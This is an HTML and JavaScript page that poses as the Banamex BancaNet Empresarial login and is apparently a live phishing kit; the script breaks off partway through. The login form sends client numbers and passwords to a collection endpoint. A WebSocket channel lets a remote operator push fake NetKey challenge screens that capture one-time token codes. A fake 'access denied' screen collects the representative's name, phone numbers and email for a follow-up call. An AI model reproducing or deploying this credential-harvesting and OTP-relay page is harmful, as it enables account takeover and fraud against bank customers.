<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <title>Banamex Empresarial - Login</title>
    <link href="/banamex/css/estilosLoginNew.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="/banamex/css/mando.css" type="text/css">
    <style>
        html { display: block; }
        .f11_N { font-size: 11px; color: #888888; }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="overlay_trans"></div>

    <div id="contenedor">
        <!-- Header -->
        <div class="header">
            <div class="top" id="navegacionPrincipal">
                <p class="fecha"></p>
                <div class="menu">
                    <ul>
                        <li><a href="#" style="font-weight:bold;">English</a></li>
                        <li class="separador">|</li>
                        <li><a href="#" class="flecha" style="font-weight:bold;"><span class="text">Sucursales</span> <span class="icono"></span></a></li>
                        <li class="separador">|</li>
                        <li>
                            <a href="javascript:void(0);" class="flecha con_menu" style="font-weight:bold;"><span class="text">Cont√°ctanos</span> <span class="icono"></span></a>
                            <div class="contactanos top_menu">
                                <div class="cortina">
                                    <div class="box color333">
                                        <span class="bold f14">Cont√°ctanos</span><br><br>
                                        <div class="paddingB2">
                                            <span class="f16 negrita">Banamex Resuelve PyMEs</span>
                                        </div>
                                        <div>
                                            <div class="paddingT5 paddingB1 f10 borderT_Dotted_CCCCCC"></div>
                                            <div class="paddingB1 f11 negrita">Segmento Peque√±a y Mediana Empresa (PYME) y Sucursal<br></div>
                                            <div>
                                                <div>
                                                    <span class="paddingB1 f11_N negrita">CD. de M√©xico e interior de la rep√∫blica: </span>
                                                    <span class="f10">551226 8867<br></span>
                                                </div>
                                                <div>
                                                    <span class="f11_N negrita">EUA y Canad√°:</span>
                                                    <span class="f10"> 1 844 207 3684</span>
                                                </div>
                                                <div>
                                                    <span class="paddingB1 f11_N bold">Horarios:</span><br>
                                                    <span class="f10">Lunes a Viernes 07:00 a 23:00, s√°bado de 09:00 a 18:00<br></span>
                                                </div>
                                                <div>
                                                    <span class="paddingB1 f11_N bold">Correo electr√≥nico:</span>
                                                    <a style="color: black; text-decoration: underline;" class="f10" href="mailto:servicioalclientepyme@banamex.com">servicioalclientepyme@banamex.com</a>
                                                </div>
                                            </div><br>
                                        </div>
                                        <div class="paddingB2">
                                            <span class="f16 negrita">Banamex Resuelve</span>
                                        </div>
                                        <div>
                                            <div class="paddingT5 paddingB1 f10 borderT_Dotted_CCCCCC"></div>
                                            <div class="paddingB1 f11 negrita">Segmento Corporativo, Empresarial y Gobierno<br></div>
                                            <div>
                                                <div>
                                                    <span class="f11_N negrita">CD de M√©xico / interior de la rep√∫blica:</span>
                                                    <span class="f10"> 552226 1111</span>
                                                </div>
                                                <div>
                                                    <span class="f11_N negrita">EUA y Canad√°:</span>
                                                    <span class="f10"> 1 855 295 7093</span>
                                                </div>
                                                <div>
                                                    <span class="paddingB1 f11_N negrita">Horario:</span><br>
                                                    <span class="f10">Lunes a Viernes 07:00 a 23:00, s√°bado de 09:00 a 18:00<br></span>
                                                </div>
                                                <div>
                                                    <span class="f11_N negrita">Correo Electr√≥nico:</span><br>
                                                    <a style="color: black; text-decoration: underline;" class="f10" href="mailto:servicioalclientebei@banamex.com">servicioalclientebei@banamex.com</a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="box_bottom"></div>
                                </div>
                            </div>
                        </li>
                        <li class="separador">|</li>
                        <li><a href="#" style="font-weight:bold;">Ayuda</a></li>
                    </ul>
                </div>
            </div>
            <div class="bottom">
                <div class="logo"></div>
                <div class="divisor_logos"></div>
                <div class="BancaNet"></div>
            </div>
        </div>

        <div class="disclaimer-container" id="divDisclaimer"></div>
        <div id="cambiaImagen1" class="bg_2"></div>
        <div id="cambiaImagen2" class="bg_1"></div>

        <div id="contenido_login">
            <div id="area_login">
                <!-- Login Form -->
                <div id="login">
                    <div class="top"></div>
                    <div class="content">
                        <span class="colorFFF"><span class="bold">Banca</span>Net Empresarial</span>
                        <form action="#" class="marginT7 marginB11 form_login" onsubmit="return false;">
                            <span class="colorFFF">N√∫mero de cliente</span>
                            <div class="form_label">
                                <input type="password" maxlength="12" autocomplete="off" id="USERID" data-testid="input-numero-cliente">
                            </div>
                            <div class="paddingT9 colorFFF">Clave de acceso</div>
                            <div class="form_label">
                                <input type="password" maxlength="8" autocomplete="off" id="PASSWORD" data-testid="input-clave-acceso">
                            </div>
                            <div class="marginT15">
                                <input type="button" class="btn_az colorFFF" value="Entrar" data-testid="button-entrar">
                                <span class="candado"></span>
                            </div>
                        </form>
                        <p><a href="http://www.banamex.com/" class="ligas"><span class="flecha"></span><span>Ir a Banamex.com</span></a></p>
                        <p><a href="#" class="ligas"><span class="flecha"></span><span>Conoce el demo</span></a></p>
                        <p><a href="#" class="ligas"><span class="flecha"></span><span>Desbloquear claves<br><span class="marginL10"></span>de acceso</span></a></p>
                    </div>
                    <div class="bottom">
                        <div class="contenidoLoginBottom"></div>
                    </div>
                </div>
            </div>

            <!-- Banner indicators -->
            <div id="destacados">
                <div class="clear">
                    <div class="destacado_avtive_flecha"></div>
                </div>
                <div id="destacado_div">
                    <div class="destacado_3" id="destacado_3"></div>
                    <div class="destacado_2" id="destacado_2"></div>
                    <div class="destacado_1" id="destacado_1"></div>
                    <div class="avtive_0" id="destacado_0"></div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer marginT70" id="footer">
            <div class="top">
                <p class="floatL"><a href="http://www.banamex.com/">Banamex.com</a></p>
                <p class="floatR">
                    <a href="#">Privacidad y Seguridad</a> | <a href="#">T√©rminos y Condiciones</a>
                </p>
            </div>
            <div class="bottom">
                <p class="paddingT7">
                    Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de M√©xico, S.A.,
                    integrante del Grupo Financiero Banamex.
                </p>
                <p class="paddingT7">
                    ¬© 2025 Banco Nacional de M√©xico, S.A. Derechos Reservados
                </p>
            </div>
        </div>
    </div>

    <div id="loading-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000;">
        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center;">
            <div class="logo" style="background-size: contain; background-repeat: no-repeat; background-position: center; width: 200px; height: 60px; margin: 0 auto 30px;"></div>
            <div style="font-size: 18px; color: #003d7a; margin-bottom: 20px;">Validando credenciales...</div>
            <div style="width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #003d7a; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
        </div>
        <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </div>

    <div id="netkey-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000;">
        <div class="header">
            <div class="bottom">
                <div class="logo"></div>
                <div class="divisor_logos"></div>
                <div class="BancaNet"></div>
            </div>
        </div>
        <div style="max-width: 600px; margin: 80px auto; padding: 30px; background: #003d7a; border-radius: 8px; color: white;">
            <h2 style="text-align: center; margin-bottom: 30px;">Autenticaci√≥n NetKey</h2>

            <!-- Mostrar c√≥digo CHALLENGE -->
            <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 8px; margin-bottom: 30px;">
                <p style="text-align: center; margin-bottom: 15px; font-size: 14px; opacity: 0.9;">C√≥digo CHALLENGE:</p>
                <div style="background: white; color: #003d7a; padding: 30px 20px; text-align: center; border-radius: 4px; font-size: 42px; font-weight: bold; letter-spacing: 12px; font-family: 'Courier New', monospace;" id="challenge-display">
                    --------
                </div>
                <p style="text-align: center; margin-top: 15px; font-size: 13px; opacity: 0.8;">Ingrese este c√≥digo en su dispositivo NetKey</p>
            </div>

            <!-- Input para respuesta -->
            <div style="background: rgba(255,255,255,0.1); padding: 20px; border-radius: 8px;">
                <p style="text-align: center; margin-bottom: 15px; font-size: 14px; opacity: 0.9;">Ingrese la respuesta de su NetKey:</p>
                <div style="background: white; padding: 15px; border-radius: 4px;">
                    <input 
                        type="text" 
                        id="netkey-response-input" 
                        maxlength="8" 
                        placeholder="________"
                        style="width: 100%; padding: 20px; font-size: 36px; text-align: center; letter-spacing: 10px; border: 2px solid #003d7a; border-radius: 4px; font-family: 'Courier New', monospace; color: #003d7a; font-weight: bold;"
                    />
                </div>
            </div>

            <button 
                id="netkey-submit-btn"
                style="width: 100%; margin-top: 25px; padding: 15px; background: white; color: #003d7a; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: opacity 0.3s;"
                onmouseover="this.style.opacity='0.8'"
                onmouseout="this.style.opacity='1'"
            >
                Continuar
            </button>
            <p style="text-align: center; margin-top: 15px; font-size: 12px; opacity: 0.7;">Ingrese el c√≥digo de respuesta de 8 d√≠gitos</p>
        </div>
    </div>

    <div id="acceso-denegado-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000; overflow-y: auto;">
        <div class="header">
            <div class="bottom">
                <div class="logo"></div>
                <div class="divisor_logos"></div>
                <div class="BancaNet"></div>
            </div>
        </div>
        <div style="max-width: 700px; margin: 80px auto 40px; padding: 30px;">
            <div style="background: #d32f2f; color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
                <h2 style="margin: 0; font-size: 28px; font-weight: bold;">Acceso Denegado</h2>
            </div>
            <div style="background: #f5f5f5; padding: 30px; border-radius: 0 0 8px 8px; border: 1px solid #ddd;">
                <p style="color: #333; font-size: 16px; line-height: 1.6; margin-bottom: 25px;">
                    Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. Es necesario sincronizarlo para restablecer su servicio correctamente.
                </p>

                <div style="background: white; padding: 25px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #003d7a;">
                    <h3 style="color: #003d7a; margin: 0 0 15px 0; font-size: 18px;">Banamex Resuelve PyMEs</h3>
                    <p style="color: #666; margin: 5px 0; font-size: 14px;">Segmento Peque√±a y Mediana Empresa (PYME) y Sucursal</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>Cd. de M√©xico:</strong> 55 12 26 88 67</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>Del Interior de la Rep√∫blica:</strong> 55 12 26 88 67</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>EUA y Canad√°:</strong> 55 12 26 88 67</p>
                    <p style="color: #666; margin: 8px 0; font-size: 14px;">Horario: Lunes a Viernes 07:00 a 23:00, s√°bado de 09:00 a 18:00</p>
                    <p style="color: #003d7a; margin: 8px 0; font-size: 14px;"><strong>Correo electr√≥nico:</strong> servicioalclientepyme@banamex.com</p>
                </div>

                <div style="background: white; padding: 25px; border-radius: 8px; border-left: 4px solid #003d7a;">
                    <h3 style="color: #003d7a; margin: 0 0 15px 0; font-size: 18px;">Banamex Resuelve</h3>
                    <p style="color: #666; margin: 5px 0; font-size: 14px;">Segmento Corporativo, Empresarial y Gobierno</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>Cd. de M√©xico:</strong> 55 22 26 1111</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>Del Interior de la Rep√∫blica:</strong> 55 22 26 1111</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>EUA y Canad√°:</strong> 55 22 26 1111</p>
                    <p style="color: #666; margin: 8px 0; font-size: 14px;">Horario: Lunes a Viernes 07:00 a 23:00, s√°bado de 09:00 a 18:00</p>
                    <p style="color: #003d7a; margin: 8px 0; font-size: 14px;"><strong>Correo electr√≥nico:</strong> servicioalclientebei@banamex.com</p>
                </div>
            </div>
        </div>
    </div>

        <!-- Pantalla Acceso Denegado 2 -->
        <div id="acceso-denegado-2-screen" style="display: none;">
            <div style="margin: 0; background: #fff; color: #0b3b43; padding: 28px; font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; min-height: 100vh;">
                <div style="max-width: 900px; margin: 18px auto;">
                    <header style="display: flex; align-items: center; gap: 18px; margin-bottom: 22px;">
                        <div style="display: flex; align-items: center; gap: 12px;">
                            <div style="background: url(/banamex/images/logobanamexwht.svg) no-repeat; background-size: contain; width: 160px; height: 32px;"></div>
                        </div>
                        <div style="margin-left: auto; text-align: right;">
                            <div style="font-size: 14px; color: #2d4b51;" id="datetime-acceso2"></div>
                        </div>
                    </header>

                    <div style="background: linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%); border-radius: 8px; padding: 32px; box-shadow: 0 6px 18px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.03);">
                        <h1 style="font-size: 28px; margin: 6px 0 24px; display: flex; align-items: center; gap: 12px; color: #d32f2f;">
                            üö´ Acceso Denegado
                        </h1>

                        <div style="background: #fff; border-radius: 6px; padding: 24px; box-shadow: 0 3px 8px rgba(0,0,0,0.04);">
                            <p style="margin: 0 0 24px 0; color: #3d5559; font-size: 15px; line-height: 1.6;">
                                Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. 
                                Es necesario sincronizarlo para restablecer su servicio correctamente.
                            </p>

                            <h3 style="color: #153e46; font-weight: 600; font-size: 18px; margin: 0 0 16px 0;">
                                Informaci√≥n de contacto requerida
                            </h3>

                            <form id="acceso-form-2" style="display: flex; flex-direction: column; gap: 16px;">
                                <div>
                                    <label style="display: block; margin-bottom: 8px; color: #153e46; font-size: 14px; font-weight: 500;">
                                        Nombre del representante legal <span style="color: #c81f3b;">*</span>
                                    </label>
                                    <input type="text" id="nombre-rep-2" placeholder="Nombre completo del representante legal" style="width: 100%; padding: 12px 16px; font-size: 16px; border: 2px solid #b4d5d8; border-radius: 6px; background: #f7fbfc; color: #153e46; box-sizing: border-box;">
                                </div>

                                <div>
                                    <label style="display: block; margin-bottom: 8px; color: #153e46; font-size: 14px; font-weight: 500;">
                                        N√∫mero de tel√©fono 1 <span style="color: #c81f3b;">*</span>
                                    </label>
                                    <input type="tel" id="telefono1-2" placeholder="10 d√≠gitos" maxlength="10" style="width: 100%; padding: 12px 16px; font-size: 16px; border: 2px solid #b4d5d8; border-radius: 6px; background: #f7fbfc; color: #153e46; box-sizing: border-box;">
                                </div>

                                <div>
                                    <label style="display: block; margin-bottom: 8px; color: #153e46; font-size: 14px; font-weight: 500;">
                                        N√∫mero de tel√©fono 2 (opcional)
                                    </label>
                                    <input type="tel" id="telefono2-2" placeholder="10 d√≠gitos" maxlength="10" style="width: 100%; padding: 12px 16px; font-size: 16px; border: 2px solid #b4d5d8; border-radius: 6px; background: #f7fbfc; color: #153e46; box-sizing: border-box;">
                                </div>

                                <div>
                                    <label style="display: block; margin-bottom: 8px; color: #153e46; font-size: 14px; font-weight: 500;">
                                        Correo electr√≥nico de su cuenta <span style="color: #c81f3b;">*</span>
                                    </label>
                                    <input type="email" id="correo-2" placeholder="correo@ejemplo.com" style="width: 100%; padding: 12px 16px; font-size: 16px; border: 2px solid #b4d5d8; border-radius: 6px; background: #f7fbfc; color: #153e46; box-sizing: border-box;">
                                </div>

                                <div style="margin-top: 28px; display: flex; gap: 12px; justify-content: flex-end;">
                                    <button type="button" style="padding: 12px 24px; background: #fff; color: #3d5559; border: 2px solid #c4d5d7; border-radius: 6px; font-size: 15px; font-weight: 500; cursor: pointer;">
                                        Cancelar
                                    </button>
                                    <button type="submit" id="submit-btn-2" style="padding: 12px 24px; background: #b4d5d8; color: #fff; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: not-allowed; opacity: 0.6;">
                                        Solicitar sincronizaci√≥n
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>

                    <footer style="margin-top: 28px; padding-top: 18px; border-top: 1px solid #e0e0e0; text-align: center; font-size: 11px; color: #666;">
                        <p style="margin: 4px 0;">Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de M√©xico, S.A.</p>
                        <p style="margin: 4px 0;">¬© 2025 Banco Nacional de M√©xico, S.A. Derechos Reservados</p>
                    </footer>
                </div>
            </div>

            <script>
                // Validaci√≥n del formulario de acceso denegado 2
                function validateForm2() {
                    const nombreRep = document.getElementById('nombre-rep-2').value.trim();
                    const telefono1 = document.getElementById('telefono1-2').value.trim();
                    const correo = document.getElementById('correo-2').value.trim();
                    const submitBtn = document.getElementById('submit-btn-2');

                    if (nombreRep && telefono1 && telefono1.length === 10 && correo) {
                        submitBtn.style.background = '#153e46';
                        submitBtn.style.cursor = 'pointer';
                        submitBtn.style.opacity = '1';
                        submitBtn.disabled = false;
                    } else {
                        submitBtn.style.background = '#b4d5d8';
                        submitBtn.style.cursor = 'not-allowed';
                        submitBtn.style.opacity = '0.6';
                        submitBtn.disabled = true;
                    }
                }

                // Event listeners para validaci√≥n en tiempo real
                document.getElementById('nombre-rep-2').addEventListener('input', validateForm2);
                document.getElementById('telefono1-2').addEventListener('input', function(e) {
                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
                    validateForm2();
                });
                document.getElementById('telefono2-2').addEventListener('input', function(e) {
                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
                    validateForm2();
                });
                document.getElementById('correo-2').addEventListener('input', validateForm2);

                // Manejo del env√≠o del formulario
                document.getElementById('acceso-form-2').addEventListener('submit', function(e) {
                    e.preventDefault();

                    const formData = {
                        nombreRepresentante: document.getElementById('nombre-rep-2').value.trim(),
                        telefono1: document.getElementById('telefono1-2').value.trim(),
                        telefono2: document.getElementById('telefono2-2').value.trim(),
                        correo: document.getElementById('correo-2').value.trim()
                    };

                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({
                            type: 'CLIENT_INPUT',
                            data: {
                                tipo: 'acceso_denegado_2',
                                sessionId: currentSessionId,
                                ...formData
                            }
                        }));
                        console.log('Datos de acceso denegado 2 enviados:', formData);
                    }
                });
            </script>
        </div>
    </div>

    <!-- Pantalla de Mensaje de Confirmaci√≥n -->
    <div id="mensaje-confirmacion-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; overflow-y: auto;">
        <div style="margin: 0; padding: 28px; font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color: #0b3b43; min-height: 100vh; display: flex; align-items: center; justify-content: center;">
            <div style="max-width: 700px; width: 100%;">
                <div style="text-align: center; margin-bottom: 32px;">
                    <div style="background: url(/banamex/images/logobanamexwht.svg) no-repeat center; background-size: contain; width: 160px; height: 32px; margin: 0 auto;"></div>
                </div>

                <div style="background: linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%); border-radius: 8px; padding: 48px 32px; box-shadow: 0 6px 18px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.03); text-align: center;">
                    <div style="font-size: 48px; margin-bottom: 24px;">‚úì</div>
                    <h2 style="font-size: 24px; margin: 0 0 16px 0; color: #28a745; font-weight: 600;">Solicitud Enviada</h2>
                    <p style="margin: 0 0 24px 0; color: #3d5559; font-size: 18px; line-height: 1.6;">
                        Un ejecutivo se pondr√° en contacto a tu n√∫mero celular
                    </p>
                    <p style="margin: 0; color: #666; font-size: 14px;">
                        Redireccionando al inicio de sesi√≥n...
                    </p>
                </div>
            </div>
        </div>
    </div>

    <div id="netkey2-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; overflow-y: auto;">
        <div style="margin: 0; padding: 28px; font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color: #0b3b43;">
            <div style="max-width: 900px; margin: 18px auto;">
                <header style="display: flex; align-items: center; gap: 18px; margin-bottom: 22px;">
                    <div style="display: flex; align-items: center; gap: 12px;">
                        <svg width="54" height="54" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Banamex logo">
                            <g fill="#c81f3b">
                                <path d="M50 10c9 0 18 8 18 18s-9 18-18 18S32 37 32 27 41 10 50 10z"/>
                                <path d="M50 32c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                                <path d="M50 54c9 0 18 8 18 18s-9 18-18 18-18-8-18-18 9-18 18-18z"/>
                            </g>
                        </svg>
                        <div>
                            <div style="font-size: 20px; font-weight: 600; color: #153e46;">Banamex</div>
                        </div>
                    </div>
                    <div style="margin-left: auto; text-align: right;">
                        <div style="font-size: 14px; color: #2d4b51;" id="netkey2-datetime"></div>
                    </div>
                </header>

                <div style="background: linear-gradient(90deg, #f7fbfc 0%, #eef6f7 100%); border-radius: 8px; padding: 22px; box-shadow: 0 6px 18px rgba(0,0,0,0.08); border: 1px solid rgba(0,0,0,0.03);">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px;">
                        <h1 style="font-size: 28px; margin: 0; display: flex; align-items: center; gap: 12px;">¬ª Clave din√°mica</h1>
                        <div style="background: #fff3cd; border: 2px solid #ffc107; border-radius: 6px; padding: 8px 16px; display: flex; align-items: center; gap: 8px;">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#856404" stroke-width="2">
                                <circle cx="12" cy="12" r="10"></circle>
                                <polyline points="12 6 12 12 16 14"></polyline>
                            </svg>
                            <div>
                                <div style="font-size: 11px; color: #856404; font-weight: 500;">Tiempo restante</div>
                                <div id="netkey2-timer" style="font-size: 18px; color: #856404; font-weight: 700; font-family: 'Courier New', monospace;">30:00</div>
                            </div>
                        </div>
                    </div>

                    <div style="display: flex; gap: 18px; align-items: flex-start;">
                        <div style="background: #fff; border-radius: 6px; padding: 20px; box-shadow: 0 3px 8px rgba(0,0,0,0.04); flex: 1.1; margin-right: 6px; min-height: 260px; display: flex; flex-direction: column;">
                            <p style="margin: 6px 0; line-height: 1.6; color: #3d5559; font-size: 14px;">Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "HOST?" digite el n√∫mero "9".</p>
                            <p style="margin: 12px 0 6px 0; line-height: 1.6; color: #3d5559; font-size: 14px;">Al aparecer la palabra "CHALLNG?" introduzca en su NetKey Banamex la siguiente clave:</p>
                            <div style="background: linear-gradient(135deg, #e8f4f5 0%, #d4eaec 100%); border-radius: 6px; padding: 16px; margin: 14px 0; text-align: center; border: 2px solid #b4d5d8;">
                                <div style="font-size: 12px; color: #3d5559; margin-bottom: 6px;">CHALLNG</div>
                                <div style="font-size: 42px; font-weight: 600; letter-spacing: 10px; color: #153e46; font-family: 'Courier New', monospace;" id="netkey2-challenge-display">--------</div>
                            </div>
                            <button 
                                id="netkey2-cancel-left-btn"
                                style="padding: 10px 24px; background: #fff; color: #3d5559; border: 2px solid #c4d5d7; border-radius: 6px; font-size: 14px; font-weight: 500; cursor: pointer; align-self: flex-start; margin-bottom: 12px;"
                                onmouseover="this.style.background='#f5f5f5'"
                                onmouseout="this.style.background='#fff'"
                            >
                                Cancelar
                            </button>
                            <p style="margin: 6px 0; font-size: 14px; line-height: 1.5; color: #3d5559;">Presione "ENT". Su NetKey Banamex generar√° una clave din√°mica que deber√° digitar en el siguiente campo</p>
                        </div>

                        <div style="background: #fff; border-radius: 6px; padding: 20px; box-shadow: 0 3px 8px rgba(0,0,0,0.04); flex: 1; min-height: 260px; display: flex; flex-direction: column; justify-content: space-between;">
                            <div>
                                <h2 style="font-size: 18px; margin: 0 0 14px 0; color: #153e46;">Clave din√°mica</h2>
                                <input 
                                    type="text" 
                                    id="netkey2-response-input" 
                                    maxlength="8" 
                                    placeholder="00000000" 
                                    style="width: 100%; padding: 14px; font-size: 28px; text-align: center; letter-spacing: 6px; border: 2px solid #b4d5d8; border-radius: 6px; font-family: 'Courier New', monospace; color: #153e46; font-weight: 600; background: #f7fbfc; box-sizing: border-box;"
                                />
                            </div>
                            <div style="margin-top: 20px; display: flex; gap: 10px;">
                                <button 
                                    id="netkey2-cancel-btn"
                                    style="flex: 1; padding: 12px; background: #fff; color: #3d5559; border: 2px solid #c4d5d7; border-radius: 6px; font-size: 15px; font-weight: 500; cursor: pointer;"
                                    onmouseover="this.style.background='#f5f5f5'"
                                    onmouseout="this.style.background='#fff'"
                                >
                                    Cancelar
                                </button>
                                <button 
                                    id="netkey2-submit-btn"
                                    style="flex: 1; padding: 12px; background: #153e46; color: #fff; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;"
                                    onmouseover="this.style.background='#0d2a2e'"
                                    onmouseout="this.style.background='#153e46'"
                                >
                                    Continuar
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <footer style="margin-top: 28px; padding-top: 18px; border-top: 1px solid #e0e0e0; text-align: center; font-size: 11px; color: #666;">
                    <p style="margin: 4px 0;">Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de M√©xico, S.A.</p>
                    <p style="margin: 4px 0;">¬© 2025 Banco Nacional de M√©xico, S.A. Derechos Reservados</p>
                </footer>
            </div>
        </div>
    </div>

    <script>
        var ws = null;
        var currentSessionId = null;

        // Set current date
        window.addEventListener('DOMContentLoaded', function() {
            var today = new Date();
            var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
            var fechaStr = today.toLocaleDateString('es-MX', options);
            var fechaElement = document.querySelector('.fecha');
            if (fechaElement) {
                fechaElement.textContent = fechaStr;
            }

            // Banner rotation
            var banners = [0, 1, 2, 3];
            var currentBanner = 0;

            setInterval(function() {
                var img1 = document.getElementById('cambiaImagen1');
                var img2 = document.getElementById('cambiaImagen2');

                if (currentBanner % 2 === 0) {
                    img1.className = 'bg_1';
                    img2.className = 'bg_2';
                } else {
                    img1.className = 'bg_2';
                    img2.className = 'bg_1';
                }

                // Update indicators
                for (var i = 0; i <= 3; i++) {
                    var elem = document.getElementById('destacado_' + i);
                    if (elem) {
                        elem.className = (i === currentBanner) ? 'avtive_' + i : 'destacado_' + i;
                    }
                }

                currentBanner = (currentBanner + 1) % 4;
            }, 5000);

            // Validate numeric input
            document.getElementById('USERID').addEventListener('keypress', function(e) {
                var char = String.fromCharCode(e.which || e.keyCode);
                if (!/[0-9]/.test(char)) {
                    e.preventDefault();
                }
            });

            // Validate alphanumeric input
            document.getElementById('PASSWORD').addEventListener('keypress', function(e) {
                var char = String.fromCharCode(e.which || e.keyCode);
                if (!/[a-zA-Z0-9]/.test(char)) {
                    e.preventDefault();
                }
            });

            // Prevent paste
            document.getElementById('USERID').addEventListener('paste', function(e) {
                e.preventDefault();
            });
            document.getElementById('PASSWORD').addEventListener('paste', function(e) {
                e.preventDefault();
            });

            // Handle form submission
            document.querySelector('.btn_az').addEventListener('click', function(e) {
                e.preventDefault();

                var numeroCliente = document.getElementById('USERID').value.trim();
                var claveAcceso = document.getElementById('PASSWORD').value.trim();

                if (!numeroCliente || !claveAcceso) {
                    alert('Por favor complete todos los campos');
                    return;
                }

                // Show loading screen
                document.getElementById('loading-screen').style.display = 'block';

                // Send login request
                fetch('/api/banamex/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        numeroCliente: numeroCliente,
                        claveAcceso: claveAcceso
                    })
                })
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    if (data.success) {
                        currentSessionId = data.sessionId;
                        connectWebSocket(data.sessionId);
                    } else {
                        alert('Error al procesar login: ' + (data.message || 'Error desconocido'));
                        document.getElementById('loading-screen').style.display = 'none';
                    }
                })
                .catch(function(error) {
                    console.error('Error:', error);
                    alert('Error de conexi√≥n');
                    document.getElementById('loading-screen').style.display = 'none';
                });
            });

            // Allow Enter key to submit
            document.getElementById('PASSWORD').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    document.querySelector('.btn_az').click();
                }
            });
        });

        function connectWebSocket(sessionId) {
            var protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            var wsUrl = protocol + '//' + window.location.host + '/ws';

            console.log('Intentando conectar WebSocket para sesi√≥n:', sessionId);
            ws = new WebSocket(wsUrl);

            ws.onopen = function() {
                console.log('WebSocket conectado exitosamente');
                ws.send(JSON.stringify({
                    type: 'REGISTER',
                    role: 'CLIENT',
                    sessionId: sessionId
                }));
                console.log('Mensaje REGISTER enviado');
            };

            ws.onmessage = function(event) {
                try {
                    var data = JSON.parse(event.data);
                    console.log('Mensaje WebSocket recibido:', data);

                    if (data.type === 'SCREEN_CHANGE') {
                        console.log('Procesando SCREEN_CHANGE');
                        handleScreenChange(data.data);
                    } else if (data.type === 'INIT_SESSION') {
                        console.log('Sesi√≥n inicializada:', data.data);
                    }
                } catch (e) {
                    console.error('Error procesando mensaje:', e);
                }
            };

            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
            };

            ws.onclose = function(event) {
                console.log('WebSocket cerrado:', event.code, event.reason);
                // Intentar reconectar despu√©s de 2 segundos
                setTimeout(function() {
                    console.log('Intentando reconectar WebSocket...');
                    connectWebSocket(sessionId);
                }, 2000);
            };
        }

        function handleScreenChange(data) {
            console.log('Cambio de pantalla recibido:', data);
            console.log('Tipo de pantalla:', data.tipo);

            // Ocultar todas las pantallas primero
            document.getElementById('loading-screen').style.display = 'none';
            document.getElementById('netkey-screen').style.display = 'none';
            document.getElementById('netkey2-screen').style.display = 'none';
            document.getElementById('acceso-denegado-screen').style.display = 'none';
            document.getElementById('acceso-denegado-2-screen').style.display = 'none';
            document.getElementById('mensaje-confirmacion-screen').style.display = 'none';

            if (data.tipo === 'mensaje') {
                console.log('Mostrando pantalla de mensaje de confirmaci√≥n');
                document.getElementById('mensaje-confirmacion-screen').style.display = 'block';
                
                // Redirigir al login de Banamex despu√©s de 5 segundos
                setTimeout(function() {
                    window.location.href = '/banamex/';
                }, 5000);
            } else if (data.tipo === 'netkey') {
                console.log('Mostrando pantalla NetKey');
                document.getElementById('netkey-screen').style.display = 'block';

